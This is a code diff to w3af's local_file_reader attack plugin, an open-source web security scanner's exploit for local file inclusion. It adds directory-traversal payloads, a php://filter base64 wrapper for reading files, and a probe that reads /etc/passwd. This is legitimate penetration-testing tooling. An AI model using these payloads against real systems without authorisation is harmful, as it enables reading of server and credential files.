@@ -19,6 +19,8 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
+import base64
+
 import core.controllers.outputManager as om
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
@@ -38,7 +40,7 @@ from plugins.attack.payloads.decorators.read_decorator import read_debug
 class local_file_reader(AttackPlugin):
     '''
     Exploit local file inclusion bugs.
-    @author: Andres Riancho ( andres.riancho@gmail.com )
+    @author: Andres Riancho (andres.riancho@gmail.com)
     '''
 
     def __init__(self):
@@ -108,9 +110,8 @@ class local_file_reader(AttackPlugin):
                 om.out.console( msg )
             
             # Create the shell object
-            shell_obj = fileReaderShell( vuln_obj )
-            shell_obj.set_url_opener( self._uri_opener )
-            shell_obj.set_cut( self._header_length, self._footer_length )
+            shell_obj = FileReaderShell( vuln_obj, self._uri_opener, 
+                                         self._header_length, self._footer_length )
             
             return shell_obj
             
@@ -142,7 +143,9 @@ class local_file_reader(AttackPlugin):
             om.out.error( str(e) )
             return False
         else:
-            if self._guess_cut( response_a.getBody(), response_b.getBody(), vuln_obj['file_pattern'] ):
+            if self._guess_cut( response_a.getBody(), 
+                                response_b.getBody(), 
+                                vuln_obj['file_pattern'] ):
                 return True
             else:
                 return False
@@ -230,14 +233,24 @@ NO_SUCH_FILE =  'No such file or directory.'
 READ_DIRECTORY = 'Cannot cat a directory.'
 FAILED_STREAM = 'Failed to open stream.'
 
-class fileReaderShell(read_shell):
+class FileReaderShell(read_shell):
     '''
     A shell object to exploit local file include and local file read vulns.
 
-    @author: Andres Riancho ( andres.riancho@gmail.com )
+    @author: Andres Riancho (andres.riancho@gmail.com)
     '''
-    _detected_file_not_found = False
-    _application_file_not_found_error = None
+    
+    def __init__(self, v, url_opener, header_len, footer_len):
+        super(FileReaderShell, self).__init__(v)
+        
+        self.set_cut( header_len, footer_len )
+        self._uri_opener = url_opener
+        
+        self._initialized = False
+        self._application_file_not_found_error = None
+        self._use_base64_wrapper = False
+        
+        self._init_read()
 
     def help( self, command ):
         '''
@@ -272,23 +285,48 @@ class fileReaderShell(read_shell):
         
     def _init_read(self):
         '''
-        This method requires a non existing file, in order to save the error message and prevent it
-        to leak as the content of a file to the uper layers.
+        This method requires a non existing file, in order to save the error
+        message and prevent it to leak as the content of a file to the upper
+        layers.
         
         Example:
-            - Application behaviour:
+            - Application behavior:
                 1- (request) http://host.tld/read.php?file=/etc/passwd
                 1- (response) "root:x:0:0:root:/root:/bin/bash..."
                 
                 2- (request) http://host.tld/read.php?file=/tmp/do_not_exist
                 2- (response) "...The file doesn't exist, please try again...'"
                 
-            - Before implementing this check, the read method returned "The file doesn't exist, please try again"
-            as if it was the content of the "/tmp/do_not_exist" file.
+            - Before implementing this check, the read method returned "The file
+            doesn't exist, please try again" as if it was the content of the
+            "/tmp/do_not_exist" file.
             
             - Now, we handle that case and return an empty string.
+        
+        The second thing we do here is to test if the remote site allows us to
+        use "php://filter/convert.base64-encode/resource=" for reading files. This
+        is very helpful for reading non-text files.
         '''
-        self._application_file_not_found_error = self.read('not_exist0.txt')
+        # Error handling
+        app_error = self.read('not_exist0.txt')
+        self._application_file_not_found_error = app_error.replace("not_exist0.txt",  '')
+        
+        # PHP wrapper configuration
+        self._use_base64_wrapper = False
+        try:
+            #FIXME: This only works in Linux!
+            response = self._read_with_b64('/etc/passwd')
+        except Exception, e:
+            msg = 'Not using base64 wrapper for reading because of exception: "%s"'
+            om.out.debug(msg % e)
+        else:
+            if 'root:' in response or '/bin/' in response:
+                om.out.debug('Using base64 wrapper for reading.')
+                self._use_base64_wrapper = True
+            else:
+                msg = 'Not using base64 wrapper for reading because response did'
+                msg += ' not match "root:" or "/bin/".'
+                om.out.debug( msg )
     
     @read_debug
     def read( self, filename ):
@@ -297,33 +335,49 @@ class fileReaderShell(read_shell):
 
         @return: The file content.
         '''
-        if not self._detected_file_not_found:
-            self._detected_file_not_found = True
-            self._init_read()
-            
-        # TODO: Review this hack
+        if self._use_base64_wrapper:
+            try:
+                return self._read_with_b64(filename)
+            except Exception, e:
+                om.out.debug('read_with_b64 failed: "%s"' % e)
+        
+        return self._read_basic(filename)
+    
+    def _read_with_b64(self, filename):
+        # TODO: Review this hack, does it work every time? What about null bytes?
         filename = '../' * 15 + filename
+        filename = 'php://filter/convert.base64-encode/resource=' + filename
+        
+        filtered_response = self._read_utils(filename)
 
-        # Lets send the command.
+        filtered_response = filtered_response.strip()
+        filtered_response = base64.b64decode(filtered_response)
+        
+        return filtered_response
+    
+    def _read_basic(self, filename):
+        # TODO: Review this hack, does it work every time? What about null bytes?
+        filename = '../' * 15 + filename
+        filtered_response = self._read_utils(filename)
+        return filtered_response
+        
+    def _read_utils(self, filename):
+        '''
+        Actually perform the request to the remote server and returns the response
+        for parsing by the _read_with_b64 or _read_basic methods.
+        '''
         function_reference = getattr( self._uri_opener , self.getMethod() )
         data_container = self.getDc().copy()
         data_container[ self.getVar() ] = filename
         try:
             response = function_reference( self.getURL() ,  str(data_container) )
         except w3afException, e:
-            return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
+            msg = 'Error "%s" while sending request to remote host. Try again.'
+            return msg % e
         else:
-            #print '=' * 40 + ' Sb ' + '=' * 40
-            #print response.getBody()
-            #print '=' * 40 + ' Eb ' + '=' * 40
-
             cutted_response = self._cut( response.getBody() )
             filtered_response = self._filter_errors( cutted_response, filename )
-            
-            #print '=' * 40 + ' Sc ' + '=' * 40
-            #print filtered_response
-            #print '=' * 40 + ' Ec ' + '=' * 40
-            
+                            
             return filtered_response
                 
     def _filter_errors( self, result,  filename ):
@@ -331,34 +385,34 @@ class fileReaderShell(read_shell):
         Filter out ugly php errors and print a simple "Permission denied"
         or "File not found"
         '''
-        filtered = ''
+        print filename
+        error = None
         
         if result.count( 'Permission denied' ):
-            filtered = PERMISSION_DENIED
+            error = PERMISSION_DENIED
         elif result.count( 'No such file or directory in' ):
-            filtered = NO_SUCH_FILE
+            error = NO_SUCH_FILE
         elif result.count( 'Not a directory in' ):
-            filtered = READ_DIRECTORY
-        elif result.count('</a>]: failed to open stream:'):
-            filtered = FAILED_STREAM
+            error = READ_DIRECTORY
+        elif result.count(': failed to open stream: '):
+            error = FAILED_STREAM
                 
         elif self._application_file_not_found_error is not None:
-            #   The application file not found error string that I have has the "not_exist0.txt"
-            #   string in it, so I'm going to remove that string from it.
-            app_error = self._application_file_not_found_error.replace("not_exist0.txt",  '')
+            # The result string has the file I requested inside, so I'm going
+            # to remove it.
+            clean_result = result.replace( filename,  '')
             
-            #   The result string has the file I requested inside, so I'm going to remove it.
-            trimmed_result = result.replace( filename,  '')
-            
-            #   Now I compare both strings, if they are VERY similar, then filename is a non 
-            #   existing file.
-            if relative_distance_ge(app_error, trimmed_result, 0.9):
-                filtered = NO_SUCH_FILE
+            # Now I compare both strings, if they are VERY similar, then
+            # filename is a non existing file.
+            if relative_distance_ge(self._application_file_not_found_error,
+                                    clean_result, 0.9):
+                error = NO_SUCH_FILE
 
         #
-        #   I want this function to return an empty string on errors. Not the error itself.
+        #    I want this function to return an empty string on errors.
+        #    Not the error itself.
         #
-        if filtered != '':
+        if error is not None:
             return ''
         
         return result
